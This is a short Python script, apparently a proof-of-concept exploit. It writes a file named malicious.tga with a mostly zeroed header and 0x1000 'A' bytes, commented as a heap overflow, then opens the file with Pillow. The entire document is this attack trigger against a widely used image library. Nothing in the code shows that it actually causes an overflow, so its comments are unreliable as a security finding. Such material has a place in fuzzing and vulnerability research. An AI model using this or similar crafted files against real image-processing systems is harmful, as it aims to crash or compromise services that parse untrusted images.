from PIL import Image

# Create a malicious TGA image file
with open("malicious.tga", "wb") as f:
    f.write(b"\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")  # Invalid TGA header
    f.write(b"A" * 0x1000)  # Large buffer to overflow the heap

# Open the malicious TGA image file using Pillow
try:
    img = Image.open("malicious.tga")
    print("Image opened successfully!")
except Exception as e:
    print("Error opening image:", e)